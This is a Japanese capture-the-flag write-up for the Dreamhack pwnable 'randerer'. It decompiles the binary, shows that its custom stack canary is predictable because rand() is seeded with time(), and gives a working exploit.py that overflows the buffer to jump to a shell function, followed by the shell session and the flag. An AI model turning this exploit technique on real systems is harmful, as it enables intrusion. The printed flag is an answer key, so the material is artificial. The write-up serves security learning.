# randerer:pwnable:404pts
rand() canary!  

[Download challenge](7df7de09-3c5f-4b0d-9878-ff506677a629.zip)  

Servers  
Host: host3.dreamhack.games  
Port: 23200/tcp → 8080/tcp  

# Solution
実行ファイル一式と接続先が渡される。  
まずはIDAでデコンパイルする。  
`main`は以下のようであった。  
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  time_t v3; // rax
  char buf[16]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v6; // [rsp+10h] [rbp-10h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  v6 = canary;
  v3 = time(0LL);
  printf("time: %ld\n", v3);
  printf("input your data: ");
  read(0, buf, 0x100uLL);
  if ( v6 != canary )
  {
    puts("*** stack smashing detected ***: terminated Aborted");
    exit(1);
  }
  return 0;
}
```
なぜか時間を出力してから、ユーザ入力を受け付けている。  
ユーザ入力には自明なBOFがありそうだ。  
セキュリティ機構として、canaryを独自に生成したSSPを実装している。  
canaryを生成する`init_canary`は以下のようであった。  
```c
void init_canary()
{
  unsigned int v0; // eax
  __int64 v1; // rbx
  int i; // [rsp+Ch] [rbp-14h]

  v0 = time(0LL);
  srand(v0);
  for ( i = 0; i <= 7; ++i )
  {
    v1 = canary << 8;
    canary = v1 | (unsigned __int8)rand();
  }
}
```
時間をシードにしているため予測可能だとわかる。  
ありがたいことに`win`もあるようだ。  
```c
int win()
{
  return system("/bin/sh");
}
```
つまりこの問題はcanaryを予測して破壊することなく、`win`に飛ばせということだろう。  
libcの関数をそのまま叩いてやればよい。  
以下のexploit.pyで行う。  
```py
import ctypes
from ptrlib import *

elf = ELF("./prob")

# sock = Process("./prob")
sock = Socket("nc host3.dreamhack.games 23200")
# sock.debug = True

v0 = int(sock.recvlineafter("time: "))
logger.info(f"time = {v0}")

libc = ctypes.CDLL("libc.so.6")
libc.srand(ctypes.c_uint(v0))
canary = 0
for i in range(8):
    v1 = canary << 8
    rand_value = libc.rand() & 0xFF
    canary = v1 | rand_value
logger.info(f"canary = {hex(canary)}")

payload = b"A" * 0x10
payload += p64(canary)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.symbol("win"))
sock.sendlineafter("input your data: ", payload)

sock.sh()
```
実行する。  
```bash
$ python exploit.py
[+] __init__: Successfully connected to host3.dreamhack.games:23200
[+] <module>: time = 1727503260
[+] <module>: canary = 0x415827b1bb53f92d
[ptrlib]$ ls
flag
prob
[ptrlib]$ cat flag
DH{995277f7:kBV0lnXflUSSdiRl8izGQw==}
```
flagが読み取れた。  

## DH{995277f7:kBV0lnXflUSSdiRl8izGQw==}